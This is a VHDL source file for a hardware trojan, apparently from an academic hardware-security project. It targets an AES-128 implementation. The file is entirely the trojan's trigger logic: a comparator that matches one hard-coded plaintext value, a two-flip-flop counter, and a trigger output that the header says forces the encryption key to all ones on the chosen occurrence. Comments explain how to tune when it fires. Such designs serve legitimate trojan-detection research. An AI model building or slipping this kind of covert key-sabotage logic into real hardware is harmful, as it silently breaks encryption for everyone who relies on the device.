----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date: 04/10/2025 12:40:28 PM
-- Design Name: 
-- Module Name: trojan - Behavioral
-- Project Name: IC Hardware Security
-- Target Devices: AES-128 Implementation 
-- Tool Versions: Ver 1.0
-- Description: This is a Trojan that works to count the number of times
-- a specific phrase has been found in the plaintext of an AES-128 encryption
-- and when it is the third occurrence and every fourth (FIX IF CHANGING TO THIRD)
-- time after that, it sets the encryption key to 128 bits of 1
-- by OR'ing itself with it. Otherwise it is OR'ing key with 0 which is just
-- the key
-- Dependencies: 
-- d_flip_flop
-- AES implementation
-- Revision:
-- Revision 0.01 - File Created
-- Additional Comments:
-- 
----------------------------------------------------------------------------------


library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx leaf cells in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity trojan is
    Port ( plaintext : in std_logic_vector(127 downto 0);
           Clock : in STD_LOGIC;
           Reset_A: in STD_LOGIC;
           Reset_B: in STD_LOGIC;
           trigger : out STD_LOGIC);
end trojan;

architecture Behavioral of trojan is
-- Signals here for the counter
signal reset: std_logic; -- Will determine if this is the first run and if to reset counters
signal D1 : std_logic; -- D for first counter, is equal to Q1 XOR Plaintext
signal D2 : std_logic; -- D for second counter, is equal to Q1 XOR Q2
signal Q1 : std_logic; -- output of first counter
signal Q2 : std_logic; -- output of second counter
signal plaintext_found : std_logic; -- 1 when plaintext = specific_phrase else 0
begin
-- First check if first run
reset <= Reset_A OR Clock or Reset_B; -- We know it's the first run ONLY if done, clk, and rst are 0 otherwise it is not
-- Next plaintext comparator:
-- Looking for x"..." in plaintext
plaintext_found <= '1' when plaintext=x"340737e0a29831318d305a88a8f64332" else '0';

-- First counter
-- Maps clock to clock, D to plaintext XOR first_counter and Q to first_counter
counter_1: entity work.d_flip_flop
    Port map(
        Clock => Clock,
        Reset => reset,
        D => D1,
        Q => Q1
        );
-- Set D1 to plaintext XOR Q1
D1 <= plaintext_found XOR Q1;

counter_2: entity work.d_flip_flop
    Port map(
        Clock => Clock,
        Reset => reset,
        D => D2,
        Q => Q2
        );
 -- Set D2 to Q1 XOR Q2
 D2 <= Q1 XOR Q2;
 
 -- Now actual activation trigger will be defined, activated when
 -- count=2 so when Q1=0 and Q2=1 
 -- plaintext_found = 1 so when plaintext = specific_phrase
 -- Adding when Clock aka rst ='0' to control for beginning although it worked even without it
 trigger <= NOT(Q1) AND Q2 AND plaintext_found when Clock='0' else '0';
 --trigger <= '0';
 -- Could add a check here that if trigger then reset <= '0' else reset <= reset
 -- To actually have it count every third instead of third time and then every fourth
 
end Behavioral;
